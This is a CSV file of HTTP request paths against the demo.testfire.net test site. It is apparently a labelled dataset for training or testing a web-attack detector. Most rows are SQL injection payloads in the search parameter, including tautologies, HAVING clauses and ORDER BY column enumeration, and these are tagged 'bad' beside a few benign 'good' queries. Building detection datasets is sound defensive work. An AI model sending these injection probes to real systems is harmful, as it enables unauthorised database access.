path,content,host,class_flag
/login.jsp,,demo.testfire.net,['good']
/search.jsp?query=asdasdasdasdasdas,,demo.testfire.net,['good']
/search.jsp?query=asdasdasdasdasdas,,demo.testfire.net,['good']
/search.jsp?query= OR 1=1,,demo.testfire.net,['bad']
/search.jsp?query= OR 1=0,,demo.testfire.net,['bad']
/search.jsp?query= OR x=x,,demo.testfire.net,['bad']
/search.jsp?query= OR x=y,,demo.testfire.net,['bad']
/search.jsp?query= OR 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= OR 1=0#,,demo.testfire.net,['bad']
/search.jsp?query= OR x=x#,,demo.testfire.net,['bad']
/search.jsp?query= OR x=y#,,demo.testfire.net,['bad']
/search.jsp?query= OR 1=1-- ,,demo.testfire.net,['bad']
/search.jsp?query= OR 3409=3409 AND ('pytW' LIKE 'pytY,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=1,,demo.testfire.net,['bad']
/search.jsp?query= OR 1=0-- ,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=0,,demo.testfire.net,['bad']
/search.jsp?query= OR x=x-- ,,demo.testfire.net,['bad']
/search.jsp?query= OR x=y-- ,,demo.testfire.net,['bad']
/search.jsp?query= OR 3409=3409 AND ('pytW' LIKE 'pytW,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=0#,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=1-- ,,demo.testfire.net,['bad']
/search.jsp?query= HAVING 1=0-- ,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=1,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=0,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=1-- ,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=0-- ,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=0#,,demo.testfire.net,['bad']
/search.jsp?query= AND 1=1 AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query= AND 1=0 AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query= AND 1083=1083 AND (1427=1427,,demo.testfire.net,['bad']
/search.jsp?query= AND 7506=9091 AND (5913=5913,,demo.testfire.net,['bad']
/search.jsp?query= AND 1083=1083 AND ('1427=1427,,demo.testfire.net,['bad']
/search.jsp?query= AND 7300=7300 AND 'pKlZ'='pKlZ,,demo.testfire.net,['bad']
/search.jsp?query= AND 7506=9091 AND ('5913=5913,,demo.testfire.net,['bad']
/search.jsp?query= AND 7300=7300 AND 'pKlZ'='pKlY,,demo.testfire.net,['bad']
/search.jsp?query= AND 7300=7300 AND ('pKlZ'='pKlZ,,demo.testfire.net,['bad']
/search.jsp?query= AND 7300=7300 AND ('pKlZ'='pKlY,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=1,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=0,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=0#,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=0--,,demo.testfire.net,['bad']
/search.jsp?query= AS INJECTX WHERE 1=1 AND 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=1,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=0,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=1#,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=0#,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= WHERE 1=1 AND 1=0--,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 1-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 2-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 3-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 4-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 5-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 6-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 7-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 8-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 9-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 10-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 11-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 12-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 13-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 14-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 15-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 16-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 17-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 18-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 19-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 20-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 21-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 22-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 23-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 24-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 25-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 26-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 27-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 28-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 29-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 30-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 31337-- ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 1# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 2# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 3# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 4# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 5# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 6# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 7# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 8# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 9# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 10# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 11# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 12# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 13# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 14# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 15# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 16# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 17# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 18# ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 19# ,,demo.testfire.net,['bad']
